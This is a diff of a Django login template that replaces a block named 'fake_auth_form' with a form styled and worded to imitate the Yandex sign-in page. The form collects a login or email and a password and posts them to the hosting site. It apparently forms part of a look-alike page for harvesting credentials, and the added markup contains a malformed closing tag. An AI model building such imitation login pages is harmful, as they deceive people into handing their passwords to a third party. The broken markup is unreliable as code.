@@ -4,30 +4,35 @@
     Авторизация
 {% endblock %}
 
-{% block fake_auth_form %}
-    <form method="post" autocomplete="on">
-        {% csrf_token %}
+{% block content %}
+    <div class="yandex-auth">
+        <div class="yandex-auth__bg-image">
+            ...
+        </div>
+        
+        <form class="yandex-auth__form" method="post" autocomplete="on">
+            {% csrf_token %}
 
-        <p>
-            <label>Email</label>
-            <input type="email"
-                   class="content__auth__form__field"
-                   name="email"
-                   placeholder="Введите ваш email"
-                   aria-label="Email"
-                   required>
-        </p>
-        <p>
-            <label>Пароль</label>
-            <input type="password"
-                   class="content__auth__form__field"
-                   name="password"
-                   placeholder="Введите ваш пароль"
-                   aria-label="Пароль"
-                   required
-                   pattern="\w{1,}">
-        </p>
+            <p>
+                <input type="email"
+                    class="yandex-auth__form__field"
+                    name="email"
+                    placeholder="Введите логин, почту или телефон"
+                    required>
+            </p>
 
-        <input class="content__auth__form__btn" type="submit" value="Войти">
-    </form>
+            <p>
+                <input type="password"
+                    class="yandex-auth__form__field"
+                    name="password"
+                    placeholder="Введите пароль"
+                    required
+                    pattern="\w{1,}">
+            </p
+            
+            <p>
+                <input class="content__auth__form__btn" type="submit" value="Войти">
+            </p>
+        </form>
+    </div>
 {% endblock %}
